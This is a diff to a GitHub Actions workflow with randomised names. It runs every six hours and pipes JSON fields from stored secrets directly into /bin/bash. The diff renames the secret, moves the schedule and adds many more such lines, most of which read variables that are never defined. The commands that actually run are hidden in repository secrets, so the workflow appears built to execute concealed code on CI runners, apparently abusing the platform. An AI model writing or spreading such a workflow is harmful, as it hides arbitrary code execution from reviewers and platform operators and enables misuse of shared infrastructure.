@@ -2,21 +2,31 @@ name: yutongren5423
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 2/6 * * *'
+    - cron: '38 1/6 * * *'
 
-jobs:  # 32282
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yutongren5423
         env:
-          dk24: ${{ secrets.dk24 }}
+          szbbe02: ${{ secrets.szbbe02 }}
         run: |
-          echo $dk24 | jq -r .pwcvq7 | /bin/bash
-          echo $rux7 | jq -r .h36 | /bin/bash
-          echo $arjx66054 | jq -r .fq54 | /bin/bash
-          echo $fsuwl88199 | jq -r .pqqfg7 | /bin/bash
-          echo $tkz3 | jq -r .dav456 | /bin/bash
+          echo $szbbe02 | jq -r .il90914 | /bin/bash
+          echo $ufn70 | jq -r .falqa3 | /bin/bash
+          echo $xqr77900 | jq -r .elzwa847 | /bin/bash
+          echo $grpbo14 | jq -r .rgg6 | /bin/bash
+          echo $shpi08 | jq -r .u37118 | /bin/bash
+          echo $xbpv77 | jq -r .rf63 | /bin/bash
+          echo $e74 | jq -r .nupu684 | /bin/bash
+          echo $grr34 | jq -r .qditb75030 | /bin/bash
+          echo $tq3 | jq -r .ur4 | /bin/bash
+          echo $lg6777 | jq -r .jrb098 | /bin/bash
+          echo $ilxjr4 | jq -r .zrdiw64542 | /bin/bash
+          echo $ru6 | jq -r .fnn09607 | /bin/bash
+          echo $hpuxw486 | jq -r .u79 | /bin/bash
+          echo $f1147 | jq -r .hywsa9 | /bin/bash
+          echo $vhz53416 | jq -r .l575 | /bin/bash
+          echo $oezwk12986 | jq -r .cvtao627 | /bin/bash
 
